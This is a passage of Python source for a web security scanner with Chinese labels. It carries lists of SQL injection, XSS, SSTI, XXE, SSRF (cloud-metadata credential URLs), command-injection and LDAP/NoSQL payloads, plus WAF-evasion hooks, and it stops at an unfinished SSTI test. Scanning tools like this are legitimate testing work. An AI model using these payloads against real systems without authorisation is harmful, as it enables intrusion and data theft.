import re
import json
import time
import ssl
import socket
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urljoin

from core.waf_detector import WAFDetector
from core.payload_evasion import PayloadEvasion


class APIFuzzer:
    """Comprehensive security scanner for web APIs"""

    # ── SQL Injection ──
    SQLI_ERROR_BASED = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' ORDER BY 100--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' UNION SELECT 1,2,3--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "1; WAITFOR DELAY '0:0:3'--",
        "' OR 1=1#",
        "admin'--",
        "1 OR 1=1",
        "' OR ''='",
        "') OR ('1'='1",
        "1' AND '1'='1",
        "' UNION SELECT username,password FROM users--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "' OR SLEEP(3)--",
        "1'; EXEC xp_cmdshell('whoami')--",
    ]
    SQLI_TIME_BASED = [
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1' AND pg_sleep(5)--",
        "' OR SLEEP(5)#",
    ]
    SQLI_BLIND_BOOLEAN = [
        ("' AND 1=1--", "' AND 1=2--"),
        ("' AND SUBSTRING(version(),1,1)='5'--", "' AND SUBSTRING(version(),1,1)='9'--"),
        ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
         "' AND (SELECT COUNT(*) FROM information_schema.tables)<0--"),
    ]

    # ── XSS ──
    XSS_PAYLOADS = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "'-alert(1)-'",
        "'-alert(1)-'",
        "\"><script>alert(document.cookie)</script>",
        "\"><img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "<img src=1 onerror=alert`1`>",
        "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
        "<table background=\"javascript:alert(1)\">",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
    ]

    # ── SSTI (Server Side Template Injection) ──
    SSTI_PAYLOADS = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{self.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
        "{%for c in[].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['os'].popen('id').read()}}{%endif%}{%endfor%}",
        "*=7*7",
        "[[7*7]]",
        "{7*7}",
        "@{7*7}",
        "{{7*'7'}}",
    ]
    SSTI_MARKERS = {
        '49': 'Jinja2/Twig/Mako',
        '7777777': 'Jinja2 (concat)',
        '0': 'Freemarker',
    }

    # ── XXE ──
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1">%xxe;]><foo/>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
    ]

    # ── Path Traversal ──
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/etc/passwd",
        "....\\\\....\\\\....\\\\etc/passwd",
        "%252e%252e%252fetc/passwd",
        "..;/..;/..;/etc/passwd",
        "..%00/..%00/..%00/etc/passwd",
        "..\\..\\..\\etc/passwd",
    ]
    LFI_SIGNATURES = [
        "root:.*:0:0:",
        "\\[boot loader\\]",
        "\\[extensions\\]",
        "daemon:.*:/usr/sbin",
    ]

    # ── SSRF ──
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://127.1",
        "http://0",
        "http://0x7f000001",
        "http://2130706433",
        "http://017700000001",
        "http://127.0.0.1.nip.io",
        "http://0177.0.0.1",
    ]

    # ── Command Injection ──
    CMDI_PAYLOADS = [
        "; ls",
        "| cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "; id",
        "| id",
        "& whoami &",
        "|| whoami",
        "&& whoami",
        "; ping -c 1 127.0.0.1",
        "| ping -c 1 127.0.0.1",
        "$(sleep 5)",
        "`sleep 5`",
        "; sleep 5",
        "| sleep 5",
        "%0aid",
        "%0a/usr/bin/id",
    ]

    # ── NoSQL Injection ──
    NOSQL_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": ""}',
        '{"$regex": ".*"}',
        '{"$exists": true}',
        '{"$where": "sleep(3000)"}',
        "[$gt]=",
        "[$ne]=1",
        '{"$or": [{"a": 1}, {"b": 2}]}',
        "'; return true; var a='",
        "' || 1==1//",
        "' && this.password.match(/.*/)//",
    ]

    # ── LDAP Injection ──
    LDAP_PAYLOADS = [
        "*)(uid=*))(|(uid=*",
        "admin)(&)",
        "admin*)((|",
        "*()|&'",
        ")(cn=))(|(cn=*",
    ]

    # ── Sensitive File Paths ──
    SENSITIVE_PATHS = [
        ('/.env', 'critical', '环境配置文件'),
        ('/.git/config', 'critical', 'Git 配置文件'),
        ('/.git/HEAD', 'critical', 'Git HEAD 引用'),
        ('/.git/index', 'critical', 'Git 索引文件'),
        ('/wp-config.php', 'critical', 'WordPress 配置'),
        ('/wp-config.php.bak', 'critical', 'WordPress 配置备份'),
        ('/config.php', 'critical', 'PHP 配置文件'),
        ('/config.json', 'critical', 'JSON 配置文件'),
        ('/config.yml', 'high', 'YAML 配置文件'),
        ('/application.yml', 'critical', 'Spring 配置文件'),
        ('/application.properties', 'critical', 'Spring 属性文件'),
        ('/phpinfo.php', 'high', 'PHP 信息页面'),
        ('/server-status', 'high', 'Apache 状态页'),
        ('/server-info', 'medium', 'Apache 信息页'),
        ('/.htaccess', 'high', 'Apache 访问控制'),
        ('/web.config', 'high', 'IIS 配置文件'),
        ('/debug', 'high', '调试端点'),
        ('/trace', 'high', '跟踪端点'),
        ('/console', 'critical', '调试控制台'),
        ('/api/debug', 'high', 'API 调试端点'),
        ('/elmah.axd', 'high', 'ELMAH 错误日志'),
        ('/trace.axd', 'high', 'ASP.NET 跟踪'),
        ('/swagger.json', 'medium', 'Swagger API 文档'),
        ('/swagger/v1/swagger.json', 'medium', 'Swagger API 文档'),
        ('/api-docs', 'medium', 'API 文档'),
        ('/v2/api-docs', 'medium', 'Springfox API 文档'),
        ('/.DS_Store', 'low', 'macOS 目录列表'),
        ('/Thumbs.db', 'low', 'Windows 缩略图缓存'),
        ('/backup.sql', 'critical', 'SQL 数据库备份'),
        ('/dump.sql', 'critical', 'SQL 数据库导出'),
        ('/db.sqlite', 'critical', 'SQLite 数据库文件'),
        ('/database.sqlite', 'critical', 'SQLite 数据库文件'),
        ('/backup.tar.gz', 'high', '压缩备份文件'),
        ('/backup.zip', 'high', '压缩备份文件'),
        ('/site.tar.gz', 'high', '站点备份'),
        ('/www.zip', 'high', '站点压缩包'),
        ('/wwwroot.zip', 'high', '站点压缩包'),
        ('/adminer.php', 'high', '数据库管理工具'),
        ('/phpmyadmin/', 'high', 'phpMyAdmin'),
        ('/.npmrc', 'high', 'NPM 配置（可能含 token）'),
        ('/.bash_history', 'high', 'Bash 历史记录'),
        ('/.ssh/id_rsa', 'critical', 'SSH 私钥'),
        ('/WEB-INF/web.xml', 'high', 'Java Web 配置'),
        ('/actuator', 'high', 'Spring Boot Actuator'),
        ('/actuator/env', 'critical', 'Spring Boot 环境变量'),
        ('/actuator/heapdump', 'critical', 'Spring Boot 堆转储'),
        ('/actuator/mappings', 'medium', 'Spring Boot 路由映射'),
        ('/.svn/entries', 'high', 'SVN 版本控制'),
        ('/sftp.json', 'high', 'SFTP 配置'),
        ('/docker-compose.yml', 'medium', 'Docker Compose 配置'),
    ]

    # ── Security Headers ──
    SECURITY_HEADERS = {
        'X-Content-Type-Options': ('nosniff', 'MIME 嗅探保护，防止浏览器猜测响应类型', 'low'),
        'X-Frame-Options': (['DENY', 'SAMEORIGIN'], '点击劫持保护，阻止页面被嵌入 iframe', 'medium'),
        'Strict-Transport-Security': (None, 'HSTS，强制浏览器使用 HTTPS 连接', 'medium'),
        'Content-Security-Policy': (None, 'CSP，限制页面可加载的资源来源', 'medium'),
        'X-XSS-Protection': (None, '浏览器 XSS 过滤器（已废弃但仍有参考价值）', 'low'),
        'Referrer-Policy': (None, '控制 Referer 头泄露的来源信息量', 'low'),
        'Permissions-Policy': (None, '限制浏览器功能（摄像头、麦克风等）', 'low'),
        'X-Permitted-Cross-Domain-Policies': ('none', 'Flash/Silverlight 跨域策略', 'low'),
    }

    # ── Open Redirect ──
    REDIRECT_PARAMS = [
        'redirect', 'redirecturl', 'redirect_uri', 'redirect_url',
        'url', 'next', 'return', 'returnurl', 'return_url',
        'goto', 'target', 'redir', 'callback', 'continue',
        'dest', 'destination', 'forward', 'jump', 'link',
        'location', 'navigate', 'out', 'ref', 'to',
    ]

    def __init__(self, timeout=8):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        })
        self.session.verify = False
        self._stop_flag = False

    def stop(self):
        self._stop_flag = True

    # ── Main Scan ──

    def full_scan(self, base_url, endpoints=None, progress_callback=None):
        """Run comprehensive security scan on target"""
        self._stop_flag = False
        results = {
            'target': base_url,
            'vulnerabilities': [],
            'sensitive_files': [],
            'info_disclosure': [],
            'waf_info': None,
            'evasion_results': [],
            'summary': {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0},
            'scan_time': 0,
        }

        start = time.time()
        parsed = urlparse(base_url)
        base = f'{parsed.scheme}://{parsed.netloc}'

        # Phase 0: WAF detection
        if progress_callback:
            progress_callback('检测 WAF 防护...', 3)
        try:
            waf_detector = WAFDetector(timeout=self.timeout)
            waf_info = waf_detector.detect(base_url)
            results['waf_info'] = waf_info
            if waf_info['detected']:
                if progress_callback:
                    progress_callback(f'检测到 WAF: {waf_info["waf_name"]} ({waf_info["confidence"]}%)', 5)
                evasion = PayloadEvasion()
                evaded = evasion.smart_evade(base_url, "' OR '1'='1", waf_info)
                results['evasion_results'] = evaded[:5]
        except Exception:
            results['waf_info'] = {'detected': False, 'waf_name': '', 'vendor': '', 'confidence': 0,
                                   'evidence': [], 'bypass_suggestions': [], 'details': []}

        # Phase 1: Sensitive file detection
        if progress_callback:
            progress_callback('检测敏感文件泄露...', 8)
        self._check_sensitive_files(base, results)

        # Phase 2: Security headers
        if progress_callback:
            progress_callback('检查安全响应头...', 18)
        self._check_security_headers(base_url, results)

        # Phase 3: Cookie security
        if progress_callback:
            progress_callback('检查 Cookie 安全配置...', 22)
        self._check_cookie_security(base_url, results)

        # Phase 4: TLS/SSL check
        if progress_callback:
            progress_callback('检查 TLS/SSL 配置...', 25)
        self._check_tls(parsed, results)

        # Phase 5: Test discovered endpoints
        if endpoints and not self._stop_flag:
            if progress_callback:
                progress_callback(f'测试 {min(len(endpoints), 50)} 个接口的安全性...', 30)
            self._test_endpoints(endpoints, results, progress_callback)

        # Phase 6: CORS misconfiguration
        if progress_callback:
            progress_callback('检查 CORS 配置...', 82)
        self._check_cors(base_url, results)

        # Phase 7: HTTP methods
        if progress_callback:
            progress_callback('检查 HTTP 方法...', 88)
        self._check_http_methods(base_url, results)

        # Phase 8: CSRF check on POST endpoints
        if progress_callback:
            progress_callback('检查 CSRF 防护...', 92)
        self._check_csrf(endpoints or [], results)

        results['scan_time'] = round(time.time() - start, 2)

        # Calculate summary
        for v in results['vulnerabilities']:
            sev = v.get('severity', 'info')
            results['summary'][sev] = results['summary'].get(sev, 0) + 1
        for f in results['sensitive_files']:
            sev = f.get('severity', 'high')
            results['summary'][sev] = results['summary'].get(sev, 0) + 1
        for i in results['info_disclosure']:
            sev = i.get('severity', 'low')
            results['summary'][sev] = results['summary'].get(sev, 0) + 1

        if progress_callback:
            progress_callback('安全扫描完成', 100)

        return results

    # ── Sensitive Files ──

    def _check_sensitive_files(self, base, results):
        """Check for sensitive file exposure"""
        for path, severity, desc in self.SENSITIVE_PATHS:
            if self._stop_flag:
                return
            try:
                url = base + path
                resp = self.session.get(url, timeout=5, allow_redirects=False)
                if resp.status_code == 200 and len(resp.content) > 0:
                    content = resp.text[:500].lower() if resp.text else ''
                    # Skip large custom error pages
                    if len(resp.content) < 200000:
                        # Validate it's not a custom 404
                        if not self._is_error_page(resp.text):
                            results['sensitive_files'].append({
                                'url': url,
                                'path': path,
                                'status': resp.status_code,
                                'size': len(resp.content),
                                'severity': severity,
                                'description': f'{desc}: {path}',
                                'cvss': self._cvss_sensitive(severity),
                                'remediation': '删除或限制访问此文件，确认不在 Web 根目录中',
                            })
            except Exception:
                pass

    def _is_error_page(self, text):
        """Detect custom 404/error pages"""
        if not text:
            return False
        text_lower = text[:2000].lower()
        indicators = ['404', 'not found', 'page not found', '页面不存在',
                      '找不到', 'error', 'bad request', 'access denied']
        count = sum(1 for ind in indicators if ind in text_lower)
        return count >= 3

    # ── Security Headers ──

    def _check_security_headers(self, url, results):
        """Check for missing or misconfigured security headers"""
        try:
            resp = self.session.get(url, timeout=self.timeout)
            headers_lower = {k.lower(): v for k, v in (resp.headers or {}).items()}

            for header, (expected, desc, severity) in self.SECURITY_HEADERS.items():
                val = headers_lower.get(header.lower())
                if val is None:
                    results['vulnerabilities'].append({
                        'type': 'missing_security_header',
                        'severity': severity,
                        'title': f'缺少安全响应头: {header}',
                        'description': desc,
                        'url': url,
                        'evidence': f'响应中未找到 {header} 头',
                        'cvss': self._cvss_header(severity),
                        'remediation': f'在 Web 服务器配置中添加: {header}: {expected if isinstance(expected, str) else expected[0] if isinstance(expected, list) else "<value>"}',
                    })
                elif expected and isinstance(expected, str) and expected.lower() not in val.lower():
                    results['vulnerabilities'].append({
                        'type': 'weak_security_header',
                        'severity': 'low',
                        'title': f'{header} 配置不安全',
                        'description': f'建议设置为 {expected}',
                        'url': url,
                        'evidence': f'{header}: {val}',
                        'remediation': f'修改为: {header}: {expected}',
                    })

            # Server version disclosure
            server = headers_lower.get('server', '')
            if server and re.search(r'\d+\.\d+', server):
                results['info_disclosure'].append({
                    'type': 'server_version',
                    'title': '服务器版本信息泄露',
                    'description': f'Server 头暴露了软件版本: {server}',
                    'url': url,
                    'severity': 'low',
                    'evidence': f'Server: {server}',
                    'remediation': '在 Web 服务器配置中隐藏版本号',
                })

            # X-Powered-By disclosure
            powered_by = headers_lower.get('x-powered-by', '')
            if powered_by:
                results['info_disclosure'].append({
                    'type': 'powered_by',
                    'title': '技术栈信息泄露',
                    'description': f'X-Powered-By 头暴露了后端技术: {powered_by}',
                    'url': url,
                    'severity': 'low',
                    'evidence': f'X-Powered-By: {powered_by}',
                    'remediation': '在 Web 服务器配置中移除 X-Powered-By 头',
                })

        except Exception:
            pass

    # ── Cookie Security ──

    def _check_cookie_security(self, url, results):
        """Check cookies for missing security flags"""
        try:
            resp = self.session.get(url, timeout=self.timeout)
            cookies = resp.cookies
            set_cookies = resp.headers.get('Set-Cookie', '')

            # Parse Set-Cookie headers for flags
            for cookie_line in set_cookies.split('\n') if '\n' in set_cookies else [set_cookies]:
                if not cookie_line.strip():
                    continue
                parts = cookie_line.split(';')
                cookie_name = parts[0].split('=')[0].strip() if '=' in parts[0] else parts[0].strip()
                flags = {p.strip().lower() for p in parts[1:]}

                issues = []
                if 'httponly' not in flags:
                    issues.append('缺少 HttpOnly（JS 可读取）')
                if 'secure' not in flags:
                    issues.append('缺少 Secure（HTTP 也可发送）')
                if 'samesite' not in flags:
                    issues.append('缺少 SameSite（可被跨站发送）')

                if issues:
                    results['vulnerabilities'].append({
                        'type': 'insecure_cookie',
                        'severity': 'low',
                        'title': f'Cookie 安全配置不足: {cookie_name}',
                        'description': '; '.join(issues),
                        'url': url,
                        'evidence': f'Set-Cookie: {cookie_line[:120]}',
                        'cvss': 3.1,
                        'remediation': '添加 HttpOnly、Secure、SameSite=Strict 属性',
                    })

            # Check for session cookies over HTTP
            if urlparse(url).scheme == 'http':
                for cookie in cookies:
                    if any(k in cookie.name.lower() for k in ['sess', 'token', 'auth', 'sid', 'jwt']):
                        results['vulnerabilities'].append({
                            'type': 'session_over_http',
                            'severity': 'medium',
                            'title': f'会话 Cookie 通过 HTTP 传输: {cookie.name}',
                            'description': '敏感会话标识通过未加密的 HTTP 连接传输，可能被中间人截获',
                            'url': url,
                            'evidence': f'Cookie: {cookie.name}={cookie.value[:20]}...',
                            'cvss': 5.3,
                            'remediation': '启用 HTTPS 并设置 Secure 标志',
                        })
        except Exception:
            pass

    # ── TLS/SSL ──

    def _check_tls(self, parsed, results):
        """Check TLS/SSL certificate configuration"""
        if parsed.scheme != 'https':
            results['vulnerabilities'].append({
                'type': 'no_https',
                'severity': 'medium',
                'title': '未使用 HTTPS 加密',
                'description': '站点未启用 HTTPS，所有数据以明文传输',
                'url': f'{parsed.scheme}://{parsed.netloc}',
                'evidence': f'URL scheme: {parsed.scheme}',
                'cvss': 5.3,
                'remediation': '配置 SSL/TLS 证书，启用 HTTPS 并设置 HSTS',
            })
            return

        try:
            hostname = parsed.hostname
            port = parsed.port or 443
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            with socket.create_connection((hostname, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert(binary_form=False)
                    cipher = ssock.cipher()
                    version = ssock.version()

                    if cert:
                        # Check expiry
                        not_after = ssl.cert_time_to_seconds(cert.get('notAfter', ''))
                        days_left = (not_after - time.time()) / 86400
                        if days_left < 30:
                            results['vulnerabilities'].append({
                                'type': 'cert_expiring',
                                'severity': 'medium' if days_left > 0 else 'high',
                                'title': f'SSL 证书即将过期（{int(days_left)} 天）' if days_left > 0 else 'SSL 证书已过期',
                                'description': '证书过期会导致浏览器安全警告',
                                'url': f'https://{hostname}',
                                'evidence': f'过期时间: {cert.get("notAfter")}',
                                'cvss': 5.3,
                                'remediation': '及时更新 SSL 证书',
                            })

                    # Check protocol version
                    if version and 'TLSv1.0' in version or 'TLSv1.1' in version or 'SSLv' in (version or ''):
                        results['vulnerabilities'].append({
                            'type': 'weak_tls',
                            'severity': 'medium',
                            'title': f'使用过时的加密协议: {version}',
                            'description': 'TLS 1.0/1.1 存在已知漏洞，应升级到 TLS 1.2+',
                            'url': f'https://{hostname}',
                            'evidence': f'协议: {version}',
                            'cvss': 5.3,
                            'remediation': '禁用 TLS 1.0/1.1，仅允许 TLS 1.2 和 1.3',
                        })

                    # Check cipher strength
                    if cipher and len(cipher) >= 3:
                        bits = cipher[2] if isinstance(cipher, tuple) else 0
                        if bits and bits < 128:
                            results['vulnerabilities'].append({
                                'type': 'weak_cipher',
                                'severity': 'high',
                                'title': f'弱加密算法: {cipher[0] if isinstance(cipher, tuple) else cipher}',
                                'description': f'加密强度仅 {bits} 位，低于安全标准',
                                'url': f'https://{hostname}',
                                'evidence': f'Cipher: {cipher}',
                                'cvss': 7.4,
                                'remediation': '配置强加密套件，禁用弱算法',
                            })
        except Exception:
            pass

    # ── Endpoint Testing ──

    def _test_endpoints(self, endpoints, results, progress_callback=None):
        """Test endpoints for vulnerabilities"""
        tested = 0
        total = min(len(endpoints), 50)

        evasion = None
        waf_info = results.get('waf_info')
        if waf_info and waf_info.get('detected'):
            evasion = PayloadEvasion()

        for ep in endpoints[:50]:
            if self._stop_flag:
                return
            tested += 1
            url = ep.get('url', '') if isinstance(ep, dict) else str(ep)
            method = (ep.get('method', 'GET') if isinstance(ep, dict) else 'GET').upper()

            if not url:
                continue

            if progress_callback:
                pct = 30 + int(50 * tested / max(total, 1))
                progress_callback(f'测试接口 {tested}/{total}: {url[:40]}...', pct)

            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            # GET parameter tests
            if params:
                self._test_sqli(url, params, results, evasion, waf_info)
                self._test_xss(url, params, results, evasion, waf_info)
                self._test_ssti(url, params, results)
                self._test_nosqli(url, params, results)
                self._test_cmdi(url, params, results, evasion, waf_info)
                self._test_lfi(url, params, results)
                self._test_ssrf(url, params, results)
                self._test_idor(url, results)
                self._test_open_redirect(url, params, results)

            # POST body tests (if endpoint supports POST)
            if method in ('POST', 'PUT', 'PATCH'):
                self._test_post_injection(url, results, evasion, waf_info)

    # ── SQL Injection ──

    def _test_sqli(self, url, params, results, evasion=None, waf_info=None):
        """Test for SQL injection — error-based, time-based, boolean-based"""
        # Get baseline response
        try:
            baseline = self.session.get(url, timeout=self.timeout)
            baseline_len = len(baseline.text) if baseline.text else 0
            baseline_time = baseline.elapsed.total_seconds()
        except Exception:
            return

        for param_name in list(params.keys())[:3]:
            if self._stop_flag:
                return

            # Error-based detection
            payloads = list(self.SQLI_ERROR_BASED[:8])
            if evasion and waf_info and waf_info.get('detected'):
                evaded = evasion.smart_evade(url, payloads[0], waf_info)
                payloads.extend([e['payload'] for e in evaded[:3]])

            for payload in payloads:
                if self._stop_flag:
                    return
                try:
                    resp = self._send_injected(url, params, param_name, payload)
                    if resp is None:
                        continue

                    resp_text = resp.text[:5000] if resp.text else ''
                    matched = self._match_sqli_error(resp_text)
                    if matched:
                        results['vulnerabilities'].append({
                            'type': 'sql_injection',
                            'severity': 'critical',
                            'title': f'SQL 注入漏洞 (参数: {param_name})',
                            'description': '应用未对用户输入做过滤，SQL 语句可被构造修改',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f'Payload 触发数据库报错，匹配规则: {matched}',
                            'response_snippet': self._extract_context(resp_text, matched),
                            'cvss': 9.8,
                            'remediation': '使用参数化查询（预编译语句），禁止拼接 SQL；对输入进行白名单校验',
                        })
                        return  # One finding per param

                except Exception:
                    pass

            # Time-based blind detection
            for payload in self.SQLI_TIME_BASED:
                if self._stop_flag:
                    return
                try:
                    start_time = time.time()
                    resp = self._send_injected(url, params, param_name, payload, timeout=self.timeout + 8)
                    elapsed = time.time() - start_time

                    if resp and elapsed > 4.0:
                        # Confirm with a second request
                        start2 = time.time()
                        self._send_injected(url, params, param_name, payload, timeout=self.timeout + 8)
                        elapsed2 = time.time() - start2

                        if elapsed2 > 4.0:
                            results['vulnerabilities'].append({
                                'type': 'sql_injection_blind',
                                'severity': 'critical',
                                'title': f'时间盲注 SQL 注入 (参数: {param_name})',
                                'description': '通过延时确认 SQL 注入，攻击者可逐字提取数据库内容',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f'首次响应 {elapsed:.1f}s，二次确认 {elapsed2:.1f}s（正常 ~{baseline_time:.1f}s）',
                                'cvss': 9.8,
                                'remediation': '使用参数化查询，设置 SQL 执行超时',
                            })
                            return
                except Exception:
                    pass

            # Boolean-based blind detection
            for true_payload, false_payload in self.SQLI_BLIND_BOOLEAN:
                if self._stop_flag:
                    return
                try:
                    resp_true = self._send_injected(url, params, param_name, true_payload)
                    resp_false = self._send_injected(url, params, param_name, false_payload)
                    if resp_true and resp_false:
                        len_true = len(resp_true.text or '')
                        len_false = len(resp_false.text or '')
                        # Different lengths but true is closer to baseline
                        if (resp_true.status_code == 200 and resp_false.status_code == 200
                            and abs(len_true - baseline_len) < baseline_len * 0.1
                            and abs(len_false - baseline_len) > baseline_len * 0.15):
                            results['vulnerabilities'].append({
                                'type': 'sql_injection_boolean',
                                'severity': 'critical',
                                'title': f'布尔盲注 SQL 注入 (参数: {param_name})',
                                'description': 'TRUE/FALSE 条件响应差异明显，可逐字提取数据',
                                'url': url,
                                'parameter': param_name,
                                'payload': true_payload,
                                'evidence': f'TRUE 响应 {len_true}B (近似基线 {baseline_len}B), FALSE 响应 {len_false}B',
                                'cvss': 9.8,
                                'remediation': '使用参数化查询，统一错误响应格式',
                            })
                            return
                except Exception:
                    pass

    def _match_sqli_error(self, text):
        """Match SQL error patterns in response"""
        patterns = [
            (r'SQL syntax.*MySQL', 'MySQL 语法错误'),
            (r'Warning.*mysql_', 'MySQL PHP 警告'),
            (r'mysqli?_query\(\)', 'MySQL 查询函数'),
            (r'PostgreSQL.*ERROR', 'PostgreSQL 错误'),
            (r'pg_query\(\)', 'PostgreSQL 查询'),
            (r'valid PostgreSQL result', 'PostgreSQL 结果'),
            (r'Microsoft.*ODBC.*SQL Server', 'MSSQL ODBC'),
            (r'SqlException', 'Java SQL 异常'),
            (r'System\.Data\.SqlClient', '.NET SQL 客户端'),
            (r'ORA-\d{5}', 'Oracle 错误码'),
            (r'Oracle.*Driver', 'Oracle 驱动'),
            (r'Oracle.*error', 'Oracle 错误'),
            (r'SQLite.*error', 'SQLite 错误'),
            (r'sqlite3\.OperationalError', 'SQLite3 操作错误'),
            (r'SQLSTATE\[', 'SQL 状态码'),
            (r'Unclosed quotation mark', '未闭合引号'),
            (r'quoted string not properly terminated', '引号未正确结束'),
            (r'syntax error.*SQL', 'SQL 语法错误'),
            (r'You have an error in your SQL', 'MySQL 语法错误提示'),
            (r'check the manual that corresponds to your MySQL', 'MySQL 手册提示'),
            (r'pg::SyntaxError', 'PostgreSQL 语法错误'),
            (r'JDBC.*Exception', 'Java JDBC 异常'),
            (r'com\.mysql\.jdbc', 'MySQL JDBC 驱动'),
            (r'org\.postgresql\.util\.PSQLException', 'PostgreSQL Java 异常'),
        ]
        for pattern, name in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return name
        return None

    # ── XSS ──

    def _test_xss(self, url, params, results, evasion=None, waf_info=None):
        """Test for reflected XSS"""
        for param_name in list(params.keys())[:3]:
            if self._stop_flag:
                return

            payloads = list(self.XSS_PAYLOADS)
            if evasion and waf_info and waf_info.get('detected'):
                evaded = evasion.smart_evade(url, payloads[0], waf_info)
                payloads.extend([e['payload'] for e in evaded[:3]])

            for payload in payloads:
                if self._stop_flag:
                    return
                try:
                    resp = self._send_injected(url, params, param_name, payload)
                    if not resp:
                        continue

                    resp_text = resp.text[:8000] if resp.text else ''
                    content_type = resp.headers.get('content-type', '').lower()

                    if 'html' not in content_type:
                        continue

                    # Check if payload is reflected unescaped
                    if payload in resp_text:
                        # Determine if it's actually executable (not inside a safe context)
                        context = self._xss_context(resp_text, payload)
                        results['vulnerabilities'].append({
                            'type': 'reflected_xss',
                            'severity': 'high',
                            'title': f'反射型 XSS 漏洞 (参数: {param_name})',
                            'description': f'用户输入被原样返回到 HTML {context}，攻击者可执行任意 JS',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f'Payload 在响应中未转义（上下文: {context}）',
                            'cvss': 6.1,
                            'remediation': '对输出进行 HTML 实体编码；设置 Content-Security-Policy；使用模板引擎自动转义',
                        })
                        return

                    # Partial reflection check (some chars reflected but not all)
                    key_parts = [payload[:5], payload[-5:]]
                    if all(p in resp_text for p in key_parts):
                        # Some encoding may have occurred but parts are still there
                        results['vulnerabilities'].append({
                            'type': 'partial_xss',
                            'severity': 'medium',
                            'title': f'可能的 XSS 漏洞 (参数: {param_name})',
                            'description': '输入部分被反射到响应中，可能存在绕过转义的利用方式',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f'Payload 部分片段在响应中出现',
                            'cvss': 4.7,
                            'remediation': '确保输出编码完整，设置 CSP 策略',
                        })
                        return

                except Exception:
                    pass

    def _xss_context(self, html, payload):
        """Determine the HTML context where payload is reflected"""
        idx = html.find(payload)
        if idx == -1:
            return 'unknown'
        before = html[max(0, idx-50):idx].lower()
        if '<script' in before and '</script>' not in before:
            return 'script 标签内'
        if '="' in before[-10:] or "='" in before[-10:]:
            return 'HTML 属性值'
        if '<' not in before[-5:]:
            return 'HTML 正文'
        return 'HTML 标签内'

    # ── SSTI ──

    def _test_ssti(self, url, params, results):
